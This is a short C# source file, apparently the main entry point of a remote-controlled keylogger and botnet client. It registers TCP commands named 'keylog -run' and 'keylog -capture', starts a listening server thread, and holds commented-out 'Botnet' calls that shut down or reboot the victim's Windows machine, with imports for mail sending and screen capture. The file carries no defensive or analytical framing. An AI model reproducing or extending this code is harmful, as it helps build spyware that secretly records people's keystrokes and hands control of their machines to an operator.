using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
//using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static key.KeyLogger.API;

namespace key
{
    class Program
    {
        static void Main(string[] args)
        {

            TCPAcceptRequest.Request.Instance.AcceptRequestServer("keylog -run");

            TCPAcceptRequest.Request.Instance.AcceptRequestServer("keylog -capture");

            new Thread(delegate ()
            {
                TCPAcceptRequest.RunServer.Run();
            }).Start();
           
            //Shut down
            //Botnet.API.DoExitWin(Botnet.ExitWindowsFlags.EWX_SHUTDOWN);

            //Reset
            //Botnet.API.DoExitWin(Botnet.ExitWindowsFlags.EWX_REBOOT);
        }
    }
}